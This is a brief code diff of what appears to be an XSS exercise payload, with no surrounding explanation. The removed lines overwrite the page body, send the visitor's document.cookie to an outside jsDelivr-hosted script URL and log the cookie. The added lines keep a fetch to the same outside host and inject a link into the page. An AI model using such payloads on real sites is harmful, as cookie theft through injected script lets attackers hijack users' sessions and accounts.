@@ -1,3 +1,2 @@
-document.body.innerHTML = "XSS";
-fetch("https://cdn.jsdelivr.net/gh/shaonsec/exercise/exercise.js" + document.cookie);
-console.log(document.cookie);
+document.body.innerHTML = "<a href='https://google.com' ></a>";
+fetch("https://cdn.jsdelivr.net/gh/shaonsec/exercise/exercise.js" );
